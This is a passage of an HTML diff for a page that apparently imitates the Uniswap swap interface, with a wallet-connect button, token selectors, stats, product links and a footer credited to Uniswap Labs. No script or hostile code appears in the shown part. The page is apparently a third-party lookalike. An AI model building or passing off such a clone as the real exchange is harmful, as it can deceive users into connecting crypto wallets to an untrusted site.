-      text-align: center;
-      border-top: 1px solid var(--border);
-    }
-    .social-links {
-      display: flex;
-      justify-content: center;
-      gap: 14px;
-      margin-top: 20px;
-      flex-wrap: wrap;
-    }
-    .social-link {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 30px;
-      padding: 8px 18px;
-      text-decoration: none;
-      color: var(--text);
-      font-size: 0.88rem;
-      font-weight: 500;
-      transition: border-color .2s;
-    }
-    .social-link:hover { border-color: var(--accent); }
-
-    /* ── FOOTER ── */
-    .site-footer {
-      background: var(--surface);
-      border-top: 1px solid var(--border);
-      padding: 48px 20px 24px;
-    }
-    .footer-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 32px;
-      max-width: 900px;
-      margin: 0 auto 40px;
-    }
-    @media (max-width: 680px) {
-      .footer-grid { grid-template-columns: repeat(2, 1fr); gap: 24px; }
-    }
-    @media (max-width: 380px) {
-      .footer-grid { grid-template-columns: 1fr; }
-    }
-    .footer-col .fc-title {
-      font-size: 0.78rem;
-      font-weight: 700;
-      letter-spacing: .07em;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 14px;
-    }
-    .footer-col a {
-      display: block;
-      color: var(--text);
-      text-decoration: none;
-      font-size: 0.88rem;
-      margin-bottom: 10px;
-      transition: color .2s;
-    }
-    .footer-col a:hover { color: var(--accent); }
-    .footer-bottom {
-      max-width: 900px;
-      margin: 0 auto;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 12px;
-      border-top: 1px solid var(--border);
-      padding-top: 20px;
-      font-size: 0.82rem;
-      color: var(--muted);
-    }
-    .footer-bottom-links { display: flex; gap: 16px; flex-wrap: wrap; }
-    .footer-bottom-links a { color: var(--muted); text-decoration: none; }
-    .footer-bottom-links a:hover { color: var(--accent); }
-
-    /* ── NFT / TOKENS / POOLS PAGES ── */
-    .inner-page {
-      padding: 40px 20px;
-      max-width: 900px;
-      margin: 0 auto;
-    }
-    .inner-page-header {
-      margin-bottom: 32px;
-    }
-    .inner-page-header h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }
-    .inner-page-header p { color: var(--muted); font-size: 0.95rem; }
-    .nft-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-      gap: 16px;
-    }
-    .nft-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      overflow: hidden;
-      cursor: pointer;
-      transition: border-color .2s, transform .2s;
-    }
-    .nft-card:hover { border-color: var(--accent); transform: translateY(-2px); }
-    .nft-thumb {
-      width: 100%;
-      aspect-ratio: 1;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 60px;
-    }
-    .nft-info { padding: 12px 14px; }
-    .nft-info .ni-name { font-weight: 600; font-size: 0.9rem; }
-    .nft-info .ni-price { font-size: 0.82rem; color: var(--muted); margin-top: 4px; }
-    .token-table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .token-table th, .token-table td {
-      text-align: left;
-      padding: 12px 16px;
-      font-size: 0.88rem;
-      border-bottom: 1px solid var(--border);
-    }
-    .token-table th { color: var(--muted); font-weight: 500; }
-    .token-table tr:hover td { background: var(--card2); }
-    .pool-item {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 16px 20px;
-      margin-bottom: 10px;
-      cursor: pointer;
-      transition: border-color .2s;
-    }
-    .pool-item:hover { border-color: var(--accent); }
-    .pool-pair { display: flex; align-items: center; gap: 10px; }
-    .pool-icons { display: flex; }
-    .pool-icons span {
-      width: 28px; height: 28px;
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 14px;
-      border: 2px solid var(--card);
-    }
-    .pool-icons span:last-child { margin-left: -8px; }
-    .pool-name { font-weight: 600; font-size: 0.9rem; }
-    .pool-fee  { font-size: 0.75rem; color: var(--muted); margin-top: 2px; }
-    .pool-apy { font-weight: 600; color: var(--green); font-size: 0.9rem; }
-
-    /* ── OLD FOOTER (hidden) ── */
-    footer.old-footer { display: none; }
+    /* LANDING */
+    .landing-section { width:100%; max-width:1100px; margin:0 auto; padding:0 20px; }
+    .hero-section { text-align:center; padding:80px 20px 60px; }
+    .hero-section h1 { font-size:clamp(2rem,5vw,3.6rem); font-weight:700; line-height:1.15; background:var(--gradient); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; margin-bottom:16px; }
+    .hero-section p { font-size:clamp(0.95rem,2vw,1.15rem); color:var(--muted); max-width:620px; margin:0 auto 28px; line-height:1.7; }
+    .hero-cta { display:inline-flex; align-items:center; gap:8px; background:var(--gradient); color:#fff; text-decoration:none; padding:13px 28px; border-radius:30px; font-weight:600; font-size:1rem; transition:opacity .2s; border:none; cursor:pointer; }
+    .hero-cta:hover { opacity:.88; }
+    .stats-section { padding:60px 20px; border-top:1px solid var(--border); border-bottom:1px solid var(--border); }
+    .stats-title { text-align:center; font-size:1rem; font-weight:600; color:var(--muted); letter-spacing:.06em; text-transform:uppercase; margin-bottom:40px; }
+    .stats-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:24px; max-width:900px; margin:0 auto; }
+    @media(max-width:520px){ .stats-grid{gap:16px;} }
+    .stat-card { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:24px 20px; }
+    .stat-label { font-size:0.82rem; color:var(--muted); margin-bottom:8px; }
+    .stat-value { font-size:clamp(1.6rem,4vw,2.6rem); font-weight:700; background:var(--gradient); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; line-height:1.1; }
+    .built-section { padding:70px 20px; }
+    .section-eyebrow { font-size:0.8rem; font-weight:600; letter-spacing:.08em; text-transform:uppercase; color:var(--accent); margin-bottom:8px; }
+    .section-title { font-size:clamp(1.5rem,3vw,2.2rem); font-weight:700; margin-bottom:12px; }
+    .section-sub { color:var(--muted); font-size:0.95rem; max-width:520px; line-height:1.65; margin-bottom:32px; }
+    .ticker-row { display:flex; gap:12px; overflow-x:auto; padding-bottom:6px; scrollbar-width:none; }
+    .ticker-row::-webkit-scrollbar { display:none; }
+    .ticker-chip { background:var(--card); border:1px solid var(--border); border-radius:30px; padding:8px 16px; display:flex; align-items:center; gap:10px; white-space:nowrap; font-size:0.88rem; flex-shrink:0; }
+    .ticker-chip .t-sym { font-weight:700; }
+    .ticker-chip .t-price { color:var(--muted); }
+    .ticker-chip .t-chg { font-size:0.78rem; padding:2px 6px; border-radius:5px; }
+    .down { background:rgba(255,80,80,.15); color:#ff6060; }
+    .up   { background:rgba(33,197,93,.15); color:var(--green); }
+    .products-section { padding:20px 20px 70px; }
+    .products-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:16px; max-width:900px; margin:0 auto; }
+    @media(max-width:560px){ .products-grid{grid-template-columns:1fr;} }
+    .product-card { background:var(--card); border:1px solid var(--border); border-radius:20px; padding:24px; text-decoration:none; color:var(--text); display:flex; flex-direction:column; gap:8px; transition:border-color .2s,transform .2s; }
+    .product-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
+    .product-card .pc-icon { font-size:28px; margin-bottom:4px; }
+    .product-card .pc-title { font-weight:700; font-size:1.05rem; }
+    .product-card .pc-desc { font-size:0.84rem; color:var(--muted); line-height:1.55; }
+    .product-card .pc-link { margin-top:auto; font-size:0.82rem; color:var(--accent); font-weight:600; }
+    .liquidity-section { padding:60px 20px; background:linear-gradient(180deg,transparent,rgba(168,85,247,.04) 50%,transparent); border-top:1px solid var(--border); border-bottom:1px solid var(--border); }
+    .liq-inner { max-width:700px; margin:0 auto; text-align:center; }
+    .explore-section { padding:70px 20px; }
+    .explore-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; max-width:900px; margin:24px auto 0; }
+    @media(max-width:640px){ .explore-grid{grid-template-columns:1fr;} }
+    .explore-card { background:var(--card); border:1px solid var(--border); border-radius:16px; padding:20px; text-decoration:none; color:var(--text); transition:border-color .2s; }
+    .explore-card:hover { border-color:var(--accent2); }
+    .explore-card .ec-icon { font-size:26px; margin-bottom:10px; }
+    .explore-card .ec-title { font-weight:700; font-size:0.95rem; margin-bottom:6px; }
+    .explore-card .ec-desc { font-size:0.8rem; color:var(--muted); line-height:1.55; }
+    .socials-section { padding:60px 20px; text-align:center; border-top:1px solid var(--border); }
+    .social-links { display:flex; justify-content:center; gap:14px; margin-top:20px; flex-wrap:wrap; }
+    .social-link { display:flex; align-items:center; gap:8px; background:var(--card); border:1px solid var(--border); border-radius:30px; padding:8px 18px; text-decoration:none; color:var(--text); font-size:0.88rem; font-weight:500; transition:border-color .2s; }
+    .social-link:hover { border-color:var(--accent); }
+    .site-footer { background:var(--surface); border-top:1px solid var(--border); padding:48px 20px 24px; }
+    .footer-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:32px; max-width:900px; margin:0 auto 40px; }
+    @media(max-width:680px){ .footer-grid{grid-template-columns:repeat(2,1fr);gap:24px;} }
+    @media(max-width:380px){ .footer-grid{grid-template-columns:1fr;} }
+    .footer-col .fc-title { font-size:0.78rem; font-weight:700; letter-spacing:.07em; text-transform:uppercase; color:var(--muted); margin-bottom:14px; }
+    .footer-col a { display:block; color:var(--text); text-decoration:none; font-size:0.88rem; margin-bottom:10px; transition:color .2s; }
+    .footer-col a:hover { color:var(--accent); }
+    .footer-bottom { max-width:900px; margin:0 auto; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; border-top:1px solid var(--border); padding-top:20px; font-size:0.82rem; color:var(--muted); }
+    .footer-bottom-links { display:flex; gap:16px; flex-wrap:wrap; }
+    .footer-bottom-links a { color:var(--muted); text-decoration:none; }
+    .footer-bottom-links a:hover { color:var(--accent); }
+    .inner-page { padding:40px 20px; max-width:900px; margin:0 auto; }
+    .inner-page-header { margin-bottom:32px; }
+    .inner-page-header h1 { font-size:1.8rem; font-weight:700; margin-bottom:8px; }
+    .inner-page-header p { color:var(--muted); font-size:0.95rem; }
+    .nft-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:16px; }
+    .nft-card { background:var(--card); border:1px solid var(--border); border-radius:16px; overflow:hidden; cursor:pointer; transition:border-color .2s,transform .2s; }
+    .nft-card:hover { border-color:var(--accent); transform:translateY(-2px); }
+    .nft-thumb { width:100%; aspect-ratio:1; display:flex; align-items:center; justify-content:center; font-size:60px; }
+    .nft-info { padding:12px 14px; }
+    .nft-info .ni-name { font-weight:600; font-size:0.9rem; }
+    .nft-info .ni-price { font-size:0.82rem; color:var(--muted); margin-top:4px; }
+    .token-table { width:100%; border-collapse:collapse; }
+    .token-table th,.token-table td { text-align:left; padding:12px 16px; font-size:0.88rem; border-bottom:1px solid var(--border); }
+    .token-table th { color:var(--muted); font-weight:500; }
+    .token-table tr:hover td { background:var(--card2); }
+    .pool-item { display:flex; align-items:center; justify-content:space-between; background:var(--card); border:1px solid var(--border); border-radius:14px; padding:16px 20px; margin-bottom:10px; cursor:pointer; transition:border-color .2s; }
+    .pool-item:hover { border-color:var(--accent); }
+    .pool-pair { display:flex; align-items:center; gap:10px; }
+    .pool-icons { display:flex; }
+    .pool-icons span { width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:14px; border:2px solid var(--card); overflow:hidden; }
+    .pool-icons span:last-child { margin-left:-8px; }
+    .pool-name { font-weight:600; font-size:0.9rem; }
+    .pool-fee  { font-size:0.75rem; color:var(--muted); margin-top:2px; }
+    .pool-apy  { font-weight:600; color:var(--green); font-size:0.9rem; }
   </style>
 </head>
 <body>
 
-<!-- NAVBAR -->
 <nav>
   <div class="nav-logo" onclick="showPage('swap')">
     <div class="logo-icon">🦄</div>
     <span>Uniswap</span>
   </div>
   <div class="nav-links">
-    <a href="#" onclick="showPage('swap')"   id="nav-swap"   class="active">Swap</a>
-    <a href="#" onclick="showPage('tokens')" id="nav-tokens">Tokens</a>
-    <a href="#" onclick="showPage('nfts')"   id="nav-nfts">NFTs</a>
-    <a href="#" onclick="showPage('pools')"  id="nav-pools">Pools</a>
-    <a href="#" onclick="showPage('home')"   id="nav-more">···</a>
+    <a onclick="showPage('swap')"   id="nav-swap"   class="active">Swap</a>
+    <a onclick="showPage('tokens')" id="nav-tokens">Tokens</a>
+    <a onclick="showPage('nfts')"   id="nav-nfts">NFTs</a>
+    <a onclick="showPage('pools')"  id="nav-pools">Pools</a>
+    <a onclick="showPage('home')"   id="nav-more">···</a>
   </div>
   <div class="nav-right">
     <button class="btn-connect-nav" id="navConnectBtn" onclick="openWalletModal()">Connect Wallet</button>
-    <div class="icon-btn" title="Settings" onclick="editSlippage()">⚙️</div>
+    <div class="icon-btn" onclick="editSlippage()">⚙️</div>
   </div>
 </nav>
 
-<!-- ═══════════════════════ SWAP PAGE ═══════════════════════ -->
+<!-- SWAP PAGE -->
 <div class="page active" id="page-swap">
-
   <div class="banner">
     <div class="banner-icon">🦄</div>
     <span><strong style="color:#fff">Uniswap v4 is here!</strong> <a href="#">Check out the latest updates.</a></span>
     <span class="banner-arrow">→</span>
   </div>
-
   <main>
     <div class="swap-card">
       <div class="swap-header">
         <h2>Swap</h2>
         <div class="icon-btn" style="width:32px;height:32px;border-radius:8px;font-size:14px" onclick="editSlippage()">⚙</div>
       </div>
-
-      <!-- FROM -->
       <div class="token-box" id="fromBox">
         <div class="token-row">
           <input class="token-amount" id="fromAmount" type="number" inputmode="decimal" placeholder="0" min="0" oninput="calcOutput()"/>
           <div class="token-selector" onclick="openModal('from')">
-            <div class="token-icon icon-usdt" id="fromIcon">T</div>
-            <span class="tname" id="fromSymbol">USDT</span>
+            <div class="token-icon" id="fromIcon"></div>
+            <span class="tname" id="fromSymbol">BNB</span>
             <span class="arr">▼</span>
           </div>
         </div>
         <div class="token-meta">
           <span id="fromUSD">$0.00</span>
           <div class="balance-max">
-            <span>Balance: –</span>
+            <span id="fromBalanceText">Balance: –</span>
             <button class="btn-max" onclick="setMax()">MAX</button>
           </div>
         </div>
       </div>
-
-      <!-- SWAP ARROW -->
       <div class="swap-divider">
-        <div class="swap-arrow-btn" onclick="swapTokens()" title="Inverti">↓</div>
+        <div class="swap-arrow-btn" onclick="swapTokens()">↓</div>
       </div>
-
-      <!-- TO -->
       <div class="token-box" style="margin-top:4px" id="toBox">
         <div class="token-row">
           <input class="token-amount" id="toAmount" type="number" inputmode="decimal" placeholder="0" readonly style="opacity:.7"/>
           <div class="token-selector" onclick="openModal('to')">
-            <div class="token-icon icon-bnb" id="toIcon">⬡</div>
-            <span class="tname" id="toSymbol">BNB</span>
+            <div class="token-icon" id="toIcon"></div>
+            <span class="tname" id="toSymbol">USDT</span>
             <span class="arr">▼</span>
           </div>
         </div>
         <div class="token-meta">
           <span id="toUSD">$0.00</span>
-          <span>Balance: –</span>
+          <span id="toBalanceText">Balance: –</span>
         </div>
       </div>
-
       <button class="btn-connect-main" id="mainBtn" onclick="handleSwap()">Connect Wallet</button>
-
       <div class="disclaimer">
         <span>ℹ️</span>
         <span>Connect a wallet to start swapping. By continuing you agree to the <a href="https://uniswap.org/terms-of-service" target="_blank">Terms of Service</a> and <a href="https://uniswap.org/privacy-policy" target="_blank">Privacy Policy</a> of Uniswap Labs.</span>
       </div>
     </div>
-
     <div class="price-info">
       <div class="price-row">
-        <span class="price-label">1 <span id="fromSym2">USDT</span> = <span id="rate">–</span> <span id="toSym2">BNB</span></span>
+        <span class="price-label">1 <span id="fromSym2">BNB</span> = <span id="rate">–</span> <span id="toSym2">USDT</span></span>
         <span class="price-value">–</span>
       </div>
+      <div class="price-row"><span class="price-label">Price impact</span><span class="price-value">&lt;0.01%</span></div>
+      <div class="price-row"><span class="price-label">Network fee <span class="info-icon">i</span></span><span class="price-value">~$0.10</span></div>
       <div class="price-row">
-        <span class="price-label">Price impact</span>
-        <span class="price-value">–</span>
-      </div>
-      <div class="price-row">
-        <span class="price-label">Network fee <span class="info-icon" title="Gas stimato">i</span></span>
-        <span class="price-value">~$0.10</span>
-      </div>
-      <div class="price-row">
-        <span class="price-label">Slippage tolerance <span class="info-icon" title="Slippage massimo accettato">i</span></span>
+        <span class="price-label">Slippage tolerance <span class="info-icon">i</span></span>
         <div style="display:flex;align-items:center;gap:6px">
           <span class="price-value accent" id="slippageVal">0.5%</span>
           <span class="edit-icon" onclick="editSlippage()">✏️</span>
@@ -1022,261 +297,111 @@
     </div>
   </main>
 
-  <!-- ── LANDING SECTIONS (below swap) ── -->
   <div style="width:100%">
-
-    <!-- HERO -->
-    <section class="hero-section">
-      <div class="landing-section">
-        <h1>DeFi's leading protocol.<br>Powering trillions.</h1>
-        <p>Uniswap Labs delivers every piece of the onchain economy in one platform. Get no-fees trading, proven security, and deep liquidity, all backed by crypto's most trusted DEX.</p>
-        <a class="hero-cta" href="https://app.uniswap.org/explore" target="_blank">Trade without fees ↗</a>
+    <section class="hero-section"><div class="landing-section">
+      <h1>DeFi's leading protocol.<br>Powering trillions.</h1>
+      <p>Uniswap Labs delivers every piece of the onchain economy in one platform. Get no-fees trading, proven security, and deep liquidity, all backed by crypto's most trusted DEX.</p>
+      <a class="hero-cta" href="https://app.uniswap.org/explore" target="_blank">Trade without fees ↗</a>
+    </div></section>
+    <section class="stats-section"><div class="landing-section">
+      <div class="stats-title">Uniswap Protocol Stats</div>
+      <div class="stats-grid">
+        <div class="stat-card"><div class="stat-label">All time volume</div><div class="stat-value">$2.4T</div></div>
+        <div class="stat-card"><div class="stat-label">Total value locked</div><div class="stat-value">$8.1B</div></div>
+        <div class="stat-card"><div class="stat-label">All time swappers</div><div class="stat-value">39.8M</div></div>
+        <div class="stat-card"><div class="stat-label">24H swap volume</div><div class="stat-value">$3.2B</div></div>
       </div>
-    </section>
-
-    <!-- STATS -->
-    <section class="stats-section">
-      <div class="landing-section">
-        <div class="stats-title">Uniswap Protocol Stats</div>
-        <div class="stats-grid">
-          <div class="stat-card">
-            <div class="stat-label">All time volume</div>
-            <div class="stat-value">$2.4T</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Total value locked</div>
-            <div class="stat-value">$8.1B</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">All time swappers</div>
-            <div class="stat-value">39.8M</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">24H swap volume</div>
-            <div class="stat-value">$3.2B</div>
-          </div>
-        </div>
+    </div></section>
+    <section class="built-section"><div class="landing-section">
+      <div class="section-eyebrow">Built for all the ways you swap</div>
+      <div class="section-title">Explore. Swap. Repeat.</div>
+      <div class="section-sub">Discover, research, manage, and swap crypto — all with no fees. Explore 20+ chains.</div>
+      <div class="ticker-row">
+        <div class="ticker-chip"><span>Ξ</span><span class="t-sym">ETH</span><span class="t-price">$3,521</span><span class="t-chg up">+1.43%</span></div>
+        <div class="ticker-chip"><span>$</span><span class="t-sym">USDC</span><span class="t-price">$1.00</span><span class="t-chg up">+0.01%</span></div>
+        <div class="ticker-chip"><span>🦄</span><span class="t-sym">UNI</span><span class="t-price">$7.43</span><span class="t-chg down">-4.87%</span></div>
+        <div class="ticker-chip"><span>⬡</span><span class="t-sym">BNB</span><span class="t-price">$593</span><span class="t-chg up">+2.14%</span></div>
+        <div class="ticker-chip"><span>₿</span><span class="t-sym">BTC</span><span class="t-price">$97,450</span><span class="t-chg up">+0.76%</span></div>
+        <div class="ticker-chip"><span>◎</span><span class="t-sym">SOL</span><span class="t-price">$148</span><span class="t-chg up">+3.4%</span></div>
       </div>
-    </section>
-
-    <!-- BUILT FOR ALL -->
-    <section class="built-section">
-      <div class="landing-section">
-        <div class="section-eyebrow">Built for all the ways you swap</div>
-        <div class="section-title">Explore. Swap. Repeat.</div>
-        <div class="section-sub">Discover, research, manage, and swap crypto — all with no fees. Explore 20+ chains.</div>
-        <div class="ticker-row">
-          <div class="ticker-chip"><span>Ξ</span><span class="t-sym">ETH</span><span class="t-price">$1,595.24</span><span class="t-chg down">−3.24%</span></div>
-          <div class="ticker-chip"><span>$</span><span class="t-sym">USDC</span><span class="t-price">$1.00</span><span class="t-chg up">+0.0%</span></div>
-          <div class="ticker-chip"><span>🦄</span><span class="t-sym">UNI</span><span class="t-price">$2.87</span><span class="t-chg up">+0.34%</span></div>
-          <div class="ticker-chip"><span>◎</span><span class="t-sym">SOL</span><span class="t-price">$66.49</span><span class="t-chg down">−3.29%</span></div>
-          <div class="ticker-chip"><span>₿</span><span class="t-sym">BTC</span><span class="t-price">$95,200</span><span class="t-chg up">+1.2%</span></div>
-          <div class="ticker-chip"><span>⬡</span><span class="t-sym">BNB</span><span class="t-price">$620.50</span><span class="t-chg up">+0.8%</span></div>
-        </div>
+    </div></section>
+    <section class="products-section"><div class="landing-section"><div class="products-grid">
+      <a class="product-card" href="https://wallet.uniswap.org/" target="_blank"><div class="pc-icon">📱</div><div class="pc-title">Simple. Safe. Secure.</div><div class="pc-desc">The trusted self-custody crypto wallet with no trading fees. 4.8 ★ rating.</div><div class="pc-link">Get the Wallet ↗</div></a>
+      <a class="product-card" href="https://x.uniswap.org/" target="_blank"><div class="pc-icon">⚡</div><div class="pc-title">Smarter swaps. Aggregated liquidity.</div><div class="pc-desc">Fast swaps, smart protection, and deep liquidity across every chain.</div><div class="pc-link">Try UniswapX ↗</div></a>
+      <a class="product-card" href="https://hub.uniswap.org/" target="_blank"><div class="pc-icon">🔗</div><div class="pc-title">DeFi for your users, at no cost.</div><div class="pc-desc">The same API that powers Uniswap Apps. Deep crypto liquidity.</div><div class="pc-link">Explore the API ↗</div></a>
+      <a class="product-card" href="https://www.unichain.org/" target="_blank"><div class="pc-icon">🌐</div><div class="pc-title">The DeFi chain.</div><div class="pc-desc">Build on the fast, decentralized Ethereum L2 built for DeFi.</div><div class="pc-link">Learn about Unichain ↗</div></a>
+    </div></div></section>
+    <section class="liquidity-section"><div class="liq-inner">
+      <div class="section-eyebrow" style="display:flex;justify-content:center">Earn</div>
+      <div class="section-title" style="text-align:center;margin-bottom:12px">Provide liquidity, earn fees.</div>
+      <div class="section-sub" style="margin:0 auto 28px;text-align:center">Earn by powering onchain markets with Liquidity Pools.</div>
+      <div style="text-align:center"><button onclick="showPage('pools')" class="hero-cta">View Pools ↗</button></div>
+    </div></section>
+    <section class="explore-section"><div class="landing-section">
+      <div class="section-title">Explore the UNIverse</div>
+      <div class="explore-grid">
+        <a class="explore-card" href="https://help.uniswap.org/" target="_blank"><div class="ec-icon">❓</div><div class="ec-title">Help center</div><div class="ec-desc">Browse FAQs and get support from our US-based team.</div></a>
+        <a class="explore-card" href="https://blog.uniswap.org/" target="_blank"><div class="ec-icon">📰</div><div class="ec-title">Blog</div><div class="ec-desc">Latest company news, product features and more.</div></a>
+        <a class="explore-card" href="https://docs.uniswap.org/" target="_blank"><div class="ec-icon">📚</div><div class="ec-title">Docs</div><div class="ec-desc">Developer docs to get started building with Uniswap.</div></a>
       </div>
-    </section>
-
-    <!-- PRODUCT CARDS -->
-    <section class="products-section">
-      <div class="landing-section">
-        <div class="products-grid">
-          <a class="product-card" href="https://wallet.uniswap.org/" target="_blank">
-            <div class="pc-icon">📱</div>
-            <div class="pc-title">Simple. Safe. Secure.</div>
-            <div class="pc-desc">Get the trusted self-custody crypto wallet and extension with no trading fees. Millions of downloads, 4.8 ★ rating.</div>
-            <div class="pc-link">Get the Wallet ↗</div>
-          </a>
-          <a class="product-card" href="https://x.uniswap.org/" target="_blank">
-            <div class="pc-icon">⚡</div>
-            <div class="pc-title">Smarter swaps. Aggregated liquidity.</div>
-            <div class="pc-desc">Enjoy fast swaps, smart protection, and deep liquidity across every chain.</div>
-            <div class="pc-link">Try UniswapX ↗</div>
-          </a>
-          <a class="product-card" href="https://hub.uniswap.org/" target="_blank">
-            <div class="pc-icon">🔗</div>
-            <div class="pc-title">DeFi for your users, at no cost.</div>
-            <div class="pc-desc">Use the same API that powers Uniswap Apps. Access deep crypto liquidity for your platform.</div>
-            <div class="pc-link">Explore the API ↗</div>
-          </a>
-          <a class="product-card" href="https://www.unichain.org/" target="_blank">
-            <div class="pc-icon">🌐</div>
-            <div class="pc-title">The DeFi chain.</div>
-            <div class="pc-desc">Join the community building on the fast, decentralized Ethereum L2 built to be the home for DeFi.</div>
-            <div class="pc-link">Learn about Unichain ↗</div>
-          </a>
-        </div>
+    </div></section>
+    <section class="socials-section"><div class="landing-section">
+      <div class="section-title">Follow Uniswap Labs</div>
+      <div class="social-links">
+        <a class="social-link" href="https://x.com/Uniswap" target="_blank">𝕏 Twitter</a>
+        <a class="social-link" href="https://farcaster.xyz/Uniswap" target="_blank">🟣 Farcaster</a>
+        <a class="social-link" href="https://www.linkedin.com/company/uniswaporg" target="_blank">in LinkedIn</a>
+        <a class="social-link" href="https://www.tiktok.com/@uniswap" target="_blank">♪ TikTok</a>
       </div>
-    </section>
-
-    <!-- LIQUIDITY -->
-    <section class="liquidity-section">
-      <div class="liq-inner">
-        <div class="section-eyebrow" style="justify-content:center;display:flex">Earn</div>
-        <div class="section-title" style="text-align:center;margin-bottom:12px">Provide liquidity, earn fees.</div>
-        <div class="section-sub" style="margin:0 auto 28px;text-align:center">Earn by powering onchain markets with Liquidity Pools.</div>
-        <div style="text-align:center">
-          <button onclick="showPage('pools')" class="hero-cta" style="text-decoration:none;border:none;cursor:pointer">View Pools ↗</button>
-        </div>
-      </div>
-    </section>
-
-    <!-- EXPLORE -->
-    <section class="explore-section">
-      <div class="landing-section">
-        <div class="section-title">Explore the UNIverse</div>
-        <div class="explore-grid">
-          <a class="explore-card" href="https://help.uniswap.org/" target="_blank">
-            <div class="ec-icon">❓</div>
-            <div class="ec-title">Help center</div>
-            <div class="ec-desc">Browse FAQs and get support from our US-based support team.</div>
-          </a>
-          <a class="explore-card" href="https://blog.uniswap.org/" target="_blank">
-            <div class="ec-icon">📰</div>
-            <div class="ec-title">Blog</div>
-            <div class="ec-desc">Catch up on the latest company news, product features and more.</div>
-          </a>
-          <a class="explore-card" href="https://docs.uniswap.org/" target="_blank">
-            <div class="ec-icon">📚</div>
-            <div class="ec-title">Docs</div>
-            <div class="ec-desc">Explore our library of developer docs to get started building with Uniswap.</div>
-          </a>
-        </div>
-      </div>
-    </section>
-
-    <!-- SOCIALS -->
-    <section class="socials-section">
-      <div class="landing-section">
-        <div class="section-title">Follow Uniswap Labs</div>
-        <div class="social-links">
-          <a class="social-link" href="https://x.com/Uniswap" target="_blank">𝕏 Twitter</a>
-          <a class="social-link" href="https://farcaster.xyz/Uniswap" target="_blank">🟣 Farcaster</a>
-          <a class="social-link" href="https://www.linkedin.com/company/uniswaporg" target="_blank">in LinkedIn</a>
-          <a class="social-link" href="https://www.tiktok.com/@uniswap" target="_blank">♪ TikTok</a>
-        </div>
-      </div>
-    </section>
-
-    <!-- FOOTER -->
+    </div></section>
     <footer class="site-footer">
       <div class="footer-grid">
-        <div class="footer-col">
-          <div class="fc-title">Products</div>
-          <a href="https://wallet.uniswap.org/" target="_blank">Wallet</a>
-          <a href="https://x.uniswap.org/" target="_blank">UniswapX</a>
-          <a href="https://hub.uniswap.org/" target="_blank">API</a>
-          <a href="https://www.unichain.org/" target="_blank">Unichain</a>
-        </div>
-        <div class="footer-col">
-          <div class="fc-title">Protocol</div>
-          <a href="https://vote.uniswapfoundation.org/" target="_blank">Vote</a>
-          <a href="https://uniswap.org/governance" target="_blank">Governance</a>
-          <a href="https://uniswap.org/developers" target="_blank">Developers</a>
-        </div>
-        <div class="footer-col">
-          <div class="fc-title">Company</div>
-          <a href="https://about.uniswap.org/" target="_blank">About</a>
-          <a href="https://careers.uniswap.org/" target="_blank">Careers</a>
-          <a href="https://blog.uniswap.org/" target="_blank">Blog</a>
-          <a href="https://github.com/Uniswap/brand-assets/raw/main/Uniswap%20Brand%20Assets.zip" target="_blank">Brand assets</a>
-        </div>
-        <div class="footer-col">
-          <div class="fc-title">Need help?</div>
-          <a href="https://help.uniswap.org/" target="_blank">Help center</a>
-          <a href="https://support.uniswap.org/hc/en-us/requests/new" target="_blank">Contact us</a>
-          <a href="https://cantina.xyz/bounties/f9df94db-c7b1-434b-bb06-d1360abdd1be" target="_blank">Bug bounty</a>
-        </div>
+        <div class="footer-col"><div class="fc-title">Products</div><a href="https://wallet.uniswap.org/" target="_blank">Wallet</a><a href="https://x.uniswap.org/" target="_blank">UniswapX</a><a href="https://hub.uniswap.org/" target="_blank">API</a><a href="https://www.unichain.org/" target="_blank">Unichain</a></div>
+        <div class="footer-col"><div class="fc-title">Protocol</div><a href="https://vote.uniswapfoundation.org/" target="_blank">Vote</a><a href="https://uniswap.org/governance" target="_blank">Governance</a><a href="https://uniswap.org/developers" target="_blank">Developers</a></div>
+        <div class="footer-col"><div class="fc-title">Company</div><a href="https://about.uniswap.org/" target="_blank">About</a><a href="https://careers.uniswap.org/" target="_blank">Careers</a><a href="https://blog.uniswap.org/" target="_blank">Blog</a><a href="https://github.com/Uniswap/brand-assets/raw/main/Uniswap%20Brand%20Assets.zip" target="_blank">Brand assets</a></div>
+        <div class="footer-col"><div class="fc-title">Need help?</div><a href="https://help.uniswap.org/" target="_blank">Help center</a><a href="https://support.uniswap.org/hc/en-us/requests/new" target="_blank">Contact us</a><a href="https://cantina.xyz/bounties/f9df94db-c7b1-434b-bb06-d1360abdd1be" target="_blank">Bug bounty</a></div>
       </div>
       <div class="footer-bottom">
         <span>© 2026 – Uniswap Labs</span>
-        <div class="footer-bottom-links">
-          <a href="#">Disclosures</a>
-          <a href="#">Privacy Policy</a>
-          <a href="https://uniswap.org/trademark" target="_blank">Trademark Policy</a>
-        </div>
